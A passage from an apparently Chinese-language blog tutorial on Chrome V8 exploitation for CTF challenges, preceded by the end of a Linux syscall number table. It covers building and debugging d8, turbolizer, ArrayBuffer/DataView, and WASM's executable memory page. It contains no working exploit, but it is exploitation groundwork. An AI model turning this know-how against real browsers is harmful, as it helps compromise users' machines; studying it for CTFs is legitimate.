267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 285</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_file_load 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 328</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_64_H */</span></span></span><br></pre></td></tr></table></figure></div></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Chrome V8 Pwn</title>
    <url>/2024/11/08/Chrome-v8-pwn/</url>
    <content><![CDATA[<h1 id="背景知识">背景知识</h1>
<h2 id="浏览器框架">浏览器框架</h2>
<p>它是⼀个多进程+IPC的程序, 不同的进程管理不同的内容,</p>
<ul>
<li><code>browser process</code>: 主进程</li>
<li><code>rander process</code>: 负责控制渲染内容</li>
<li><code>GPU process</code>: 负责渲染内容</li>
<li><code>utility process</code>: 标签页进程</li>
<li><code>plugin process</code>: 插件进程 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/af6f9e65fe08552b51bf639ba82f56e2.png"
                     
alt="在这里插入图片描述" 
                ></li>
</ul>
<p>每个插件, 每个标签页都是单独的进程, 有属于自己的PID <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2299f6497fe9fbb66cee7b2dea8e0080.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="js-引擎">JS 引擎</h2>
<p>各浏览器对应的 js 引擎:</p>
<ul>
<li><code>V8</code> 是 chrome 的 JS Engine ，同时也是 Node.js 的 JS
Engine 。V8调试接口非常丰富，基本上可以给你任何你想要的信息。</li>
<li>safari 的 js 引擎是 <code>webkit</code> , 除了 safari , 很多
appstore 的程序也都用 webkit 。</li>
<li>edge 以前用的是 <code>chakracore</code>, 现在用 <code>v8</code>
了。<code>chakracore</code> 几乎已经被淘汰了(代码量小,适合学习)</li>
<li><code>firefox</code> 用的是 <code>spidermonkey</code></li>
</ul>
<h2 id="js引擎流水线机制">JS引擎流水线机制</h2>
<p>js 引擎(javascript engine): 处理⼀些 js 语⾔时,
通常是先把网页代码下载下来, 浏览器来解析, 浏览器解析 js 语 句,
达到指定的效果, 浏览器可以说是 js 语⾔的解释器. <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/54722a67135f05d3bacd1edb9f6983c6.png"
                     
alt="在这里插入图片描述" 
                ></p>
<ul>
<li><code>parser</code>:
<ul>
<li>将 js 源代码变成 AST(抽象语法树)</li>
<li>检查错误的语法</li>
<li>为生成 bytecode (字节码)做准备</li>
</ul></li>
<li><code>interpreter</code>: 解释器,
可以理解成⼀个自定义的虚拟机(⼀个很大很大的 switch case 分支, 对每个
case 有不同的操作符)
<ul>
<li>将 AST 转化为 Bytecode</li>
<li>解析执行 Bytecode</li>
<li>和 <code>parser</code> 可以组成⼀个完整的 JS Engine</li>
</ul></li>
<li><code>JIT Compiler</code>(<code>optimizing compiler</code>): Just In
time编译器
<ul>
<li><code>Interpreter</code> 执行 bytecode 很慢, JIT 编译器用于优化"Hot
Function"(被执行了很多次的函数, 很热门的函数)</li>
<li>搜集函数调用时的实参类型(因为 js 是⼀个弱类型语言, 所以直接丢给
<code>interpreter</code> 解析时会出现大量分支)</li>
<li>如果收集到了可以被 JIT 优化的代码, 就会被丢到 optmizing compiler
的分支中 让 JIT 做优化,如果后续突然参数类型不⼀样了, 那么就 deoptimize
(去优化), 重新执行 bytecode . 然后 bytecode 又可以收集类型..
然后依次循环。</li>
</ul></li>
</ul>
<h2 id="常见-js-引擎架构">常见 JS 引擎架构</h2>
<ul>
<li><p><code>V8</code>(Chrome) <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/170339142b19f92b9ced0c15ccc96c6e.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
<li><p><code>SpiderMonkey</code>(FireFox) <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3ef02f5a22d6de6396d3a5f5eee042c9.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
<li><p><code>Chakra Core</code>(Edge) <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4616d4c0290a3929b0e388e592a37a8f.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
<li><p><code>Webkit</code>(safari) <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/5a2c7bb9ed7f645604659956c9140f12.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
</ul>
<h2 id="相关资料">相关资料</h2>
<ul>
<li><a class="link"   href="https://www.blackhat.com/" >漏洞网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://source.chromium.org/" >源码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h1 id="环境搭建">环境搭建</h1>
<h2 id="ubuntu-18.04">ubuntu 18.04</h2>
<h3 id="编译-v8">编译 v8</h3>
<p>首先下载用于 <code>Chromium</code> 开发的工具
<code>depot_tools</code> 。这个工具用于 <code>v8</code> 的编译。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure></div>
<p>将 <code>depot_tools</code> 添加到环境变量 <code>PATH</code>
的末尾</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:&lt;path to depot_tools&gt;</span><br></pre></td></tr></table></figure></div>
<p>挂好代理，进入到 <code>depot_tools</code> 。直接安装会
<code>ninja</code> 报错需要先将版本回退到 <code>138bff28</code>** 并且将
<code>DEPOT_TOOLS_UPDATE</code> 设为 0 。之后更新
<code>depot_tools</code> 。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard 138bff28</span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient</span><br></pre></td></tr></table></figure></div>
<p>出现以下界⾯说明更新成功 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/076214d58c9f667947cff193c11a4953.png"
                     
alt="在这里插入图片描述" 
                > 下载
<code>v8</code>，这个时间比较长，下载完后目录下会多一个 <code>v8</code>
文件夹。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">fetch v8</span><br></pre></td></tr></table></figure></div>
<p>出现如下报错是因为之前 fetch 过，<code>depot_tools</code>
有相关记录，需要添加 <code>--force</code> 参数强制下载。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">fetch --force v8</span><br></pre></td></tr></table></figure></div>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2d9e60b57c9b91542e571dad74d9e54e.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<p>根据题目需求 <code>git checkout</code> 切换 <code>v8</code>
版本，然后 <code>gclient sync -D</code> 下载相关依赖，<code>-D</code>
会删除不需要的依赖。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd v8</span><br><span class="line">git checkout  7.6.303.28</span><br><span class="line">gclient sync -D</span><br></pre></td></tr></table></figure></div>
<p>如果 <code>gclient sync</code>
出现如下报错则尝试下面这条命令（<del>貌似也不太行</del> ）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gclient config https://chromium.googlesource.com/v8/v8</span><br></pre></td></tr></table></figure></div>
<p>其实这个报错很有可能是修改了 <code>v8</code>
文件夹名称或移动目录导致的，因为每次 <code>fetch v8</code> 在
<code>depot_tools</code> 中都会有相关的记录，<code>sync</code>
需要这些记录 。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a9e1104bf1f94c6b840269b8dd3100b5.png"
                     
alt="在这里插入图片描述" 
                ></p>
<ul>
<li><p>如果题目给的是一个 Chrome
浏览器那么首先安装浏览器然后再网址栏中输入 <code>chrome://version</code>
查看版本，例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">112.0.5615.87 (正式版本) （64 位） (cohort: Bypass) </span><br></pre></td></tr></table></figure></div>
<p>打开 github 的 <a class="link" 
 href="https://github.com/chromium/chromium" >chrome <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
项目，搜索版本号并切换至相应版本。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7478b65db9045f2215b821e9a1e2267f.png"
                     
alt="在这里插入图片描述" 
                > 然后在项目根目录下的 <code>DEPS</code>
文件中查看 <code>V8</code> 版本： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/aae0870ac00cce5722ced9f43d894b24.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
<li><p>如果题目给了 <code>diff</code> 文件需要将 patch 到项目中。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git apply ./oob.diff</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>之后安装相关依赖，如果遇到下载字体未响应问题需要添加
<code>--no-chromeos-fonts</code> 参数。（每次换版本都要运行，否则 gdb
插件的 job 功能不正常）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./build/install-build-deps.sh</span><br></pre></td></tr></table></figure></div>
<p>编译 <code>v8</code> ，这里选的 <code>release</code>
版本。<code>debug</code> 版本改为 <code>x64.debug</code> ，32 为版本将
<code>x64</code> 改为 <code>ia32</code> 。如果调试漏洞的话, 最好选择
<code>release</code> 版本 因为 <code>debug</code> 版本可能会有很多检查。
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div> 另外如果出现路径错误需要切换到 <code>./tools/dev/</code>
路径再进行编译。不过这样编译最终生成的 <code>d8</code> 在
<code>tools/dev/out/x64.release</code> 目录下。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a1051554575e9c61f1d78692a54147f7.png"
                     
alt="在这里插入图片描述" 
                > 完成后是这个样子 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/cfe38b05694d9aeba1e2732c7f9566db.png"
                     
alt="在这里插入图片描述" 
                > 出现这个错误是因为 <code>out</code> 目录下的
<code>x64.release</code> 文件夹没有删。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2a1d0f71ecf94af51fcd70c0ff475d20.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>编译生成的 <code>d8</code> 在 <code>./out/x64.release/d8</code> 中。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3ae53b580f94b64b7d4b3c08b2c4b409.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="调试-v8">调试 v8</h3>
<p>在 <code>~/.gdbinit</code> 添加 <code>v8</code> 的调试插件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">source /path/to/v8/tools/gdbinit</span><br><span class="line">source /path/to/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure></div>
<p>常见参数：</p>
<ul>
<li><code>--allow-natives-syntax</code> 开启原生API (用的比较多)</li>
<li><code>--trace-turbo</code> 跟踪生成TurboFan IR</li>
<li><code>--print-bytecode</code> 打印生成的bytecode</li>
<li><code>--shell</code> 运行脚本后切入交互模式</li>
<li>更多参数可以参考 <code>--help</code></li>
</ul>
<p>调试 js 脚本时可以采用如下命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure></div>
<p>js中常见的⼀些调试技巧：</p>
<ul>
<li>在js中写⼊断点：<code>%SystemBreak();</code> ，如果不在调试模式的话,
程序直接中断, 如果在调试器中, 会被调试器识别到 并且断下来。</li>
<li>打印出对象的地址和对应的信息:
<code>%DebugPrint(var_name);</code></li>
<li>调试时输入 <code>job + DebugPrint打印的对象地址</code>
可以打印出对象的结构。</li>
</ul>
<h3 id="安装-turbolizer">安装 turbolizer</h3>
<p><code>turbolizer</code> 是一个可视化分析 JS
优化的工具，安装命令如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install npm</span><br><span class="line">cd /path/to/v8/tools/turbolizer</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n 16.20.0 # sudo n latest</span><br><span class="line">sudo npm i</span><br><span class="line">sudo npm run-script build</span><br></pre></td></tr></table></figure></div>
<p>由于 Ubuntu18.04 默认的 <code>node</code> 版本过低，需要安装
<code>16.20.0</code> 版本。另外 <code>sudo npm i</code>
如果成功结果如下图： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/6abb1619281f83f884e392cd9bb9b40d.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>最后需要启动一个 web 服务器，根据需要 8000 可以换成其它端口。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure></div>
<p>编写一个 js 脚本： <code>%OptimizeFunctionOnNextCall</code>
内置函数可以直接触发强行触发优化。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//%OptimizeFunctionOnNextCall(add);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">add</span>(i, i + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>运行 js 脚本并使用 <code>--trace-turbo</code> 参数</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./d8 --trace-turbo --allow-natives-syntax ./test.js</span><br></pre></td></tr></table></figure></div>
<p>此时会生成如下文件： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d6c28ea4d12dd171e9d98e68da5b328f.png"
                     
alt="在这里插入图片描述" 
                > 在浏览器（<strong>最好使用 Chrome
浏览器，系统自带的火狐浏览器可能有问题。</strong>）中访问
<code>http://127.0.0.1:8000/path/to/v8/tools/turbolizer/</code>（注意，这里的路径是相对于
python 启动的 web 服务的路径的相对路径而不是绝对路径）
，然后在其中打开该文件就可以进行分析。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4c5ccd404575542afecdabd6829685b5.png"
                     
alt="在这里插入图片描述" 
                > ## ubuntu 20.04 及以上（推荐） ### 编译 v8
下载 <code>depot_tools</code> <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=$PATH:&lt;path to depot_tools&gt;</span><br><span class="line">cd depot_tools</span><br><span class="line">gclient</span><br></pre></td></tr></table></figure></div> 下载、编译 v8</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">gclient sync -D</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>注意要确保 <code>ninja-build</code> 已安装。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt install ninja-build</span><br></pre></td></tr></table></figure></div> ### 安装
turbolizer <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install npm</span><br><span class="line">sudo npm install -g npm # 升级 npm 到最新版</span><br><span class="line">cd /path/to/v8/tools/turbolizer</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n latest # 升级 nodejs 到最新版</span><br><span class="line">sudo npm i</span><br><span class="line">sudo npm run-script build</span><br></pre></td></tr></table></figure></div> # 浏览器利用常用的class</p>
<h2 id="数组-array">数组 Array</h2>
<ul>
<li>数组是JS最常用的class之一，它可以存放任意类型的js object。</li>
<li>有一个 <code>length</code>
属性，可以通过下标来线性访问它的每一个元素。</li>
<li>有许多可以修改元素的接口。</li>
<li>当元素为object时，只保留指针。</li>
</ul>
<h2 id="arraybuffer-和-dataview">ArrayBuffer 和 DataView</h2>
<h3 id="arraybuffer">ArrayBuffer</h3>
<p><code>ArrayBuffer</code>
对象用来表示通用的、固定长度的原始二进制数据缓冲区。<code>ArrayBuffer</code>
不能直接操作，而是要通过类型数组对象或 <code>DataView</code>
对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容。</p>
<ul>
<li><p>语法</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(length)</span><br></pre></td></tr></table></figure></div></li>
<li><p>参数</p>
<ul>
<li><code>length</code> 要创建的 <code>ArrayBuffer</code>
的大小，单位为字节。</li>
</ul></li>
<li><p>返回值：一个指定大小的 <code>ArrayBuffer</code>
对象，其内容被初始化为 <code>0</code> 。</p></li>
</ul>
<h3 id="dataview">DataView</h3>
<p><code>DataView</code> 是一个可以从 <code>ArrayBuffer</code>
对象中读写多种数值类型的底层接口，使用它时，不用考虑不同平台的字节序问题。</p>
<ul>
<li><p>语法</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">DataView</span>(buffer [, byteOffset [, byteLength]])</span><br></pre></td></tr></table></figure></div></li>
<li><p>参数</p>
<ul>
<li><code>buffer</code>：一个 <code>ArrayBuffer</code> 或
<code>SharedArrayBuffer</code> 对象，<code>DataView</code>
对象的数据源。</li>
<li><code>byteOffset</code>（可选）：此 <code>DataView</code>
对象的第一个字节在 <code>buffer</code>
中的偏移。如果未指定，则默认从第一个字节开始。</li>
<li><code>byteLength</code>（可选）：此 <code>DataView</code>
对象的字节长度。如果未指定，则默认与 <code>buffer</code>
的长度相同。</li>
</ul></li>
<li><p>返回值：一个 <code>DataView</code>
对象，用于呈现指定的缓存区数据。你可以把返回的对象想象成一个二进制
<code>array buffer</code>
的“解释器”——它知道如何在读取或写入时正确地转换字节码。这意味着它能在二进制层面处理整数与浮点转化、字节顺序等其他有关的细节问题。</p></li>
</ul>
<h3 id="举例">举例</h3>
<p>例如下面这段代码</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab);</span><br><span class="line">dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, <span class="number">0xdeadbeef</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dv.<span class="title function_">getUint16</span>(<span class="number">2</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(dv);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>
<p>这段代码输出结果是 57005 ，即 0xdead 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c73ed9e6cf4d28ded671bc1c1e9338fb.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="wasmwebassembly">WASM（WebAssembly）</h2>
<ul>
<li><p>顾名思义，是Asm on the web
。但其实不是真正意义上的汇编，只是更加接近汇编。</p></li>
<li><p>常用接口有</p>
<ul>
<li><code>WebAssembly.Module()</code>：创建一个新的 WebAssembly
模块对象。</li>
<li><code>WebAssembly.Instance()</code>：创建一个新的 WebAssembly
实例对象。</li>
<li><code>WebAssembly.Memory()</code>：创建一个新的 WebAssembly
内存对象。</li>
<li><code>WebAssembly.Table()</code>：创建一个新的 WebAssembly
表格对象。</li>
</ul></li>
<li><p>最重要的特点：可以在 Javascript Engine
的地址空间中导入一块可读可写可执行的内存页。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1183634adb9db86c2a83a979abe4d505.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure></li>
</ul>
<h1 id="v8-的-object-通用结构">V8 的 object 通用结构</h1>
<ul>
<li><code>Object</code> 可以拥有任意属性</li>
<li>属性名可以是数字和字母的组合</li>
<li>名字为数字的属性被称作 <code>element</code> ，其他的被称作
<code>property</code> <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/593f5ca0dd5af835b2cc59a27f0c560d.png"
                     
alt="在这里插入图片描述" 
                ></li>
</ul>
<h2 id="hidden-class-map">Hidden Class (Map)</h2>
<p><code>Hidden Class</code> 也被称作 <code>Object Map</code>，简称
<code>Map</code>。位于 <code>V8 Object</code> 的第一个 8 字节。 任何由
<code>v8 gc</code> 管理的 <code>Js Object</code> ，它的前 8
个字节（或者在 32 位上是前四个字节）都是⼀个指向 <code>Map</code>
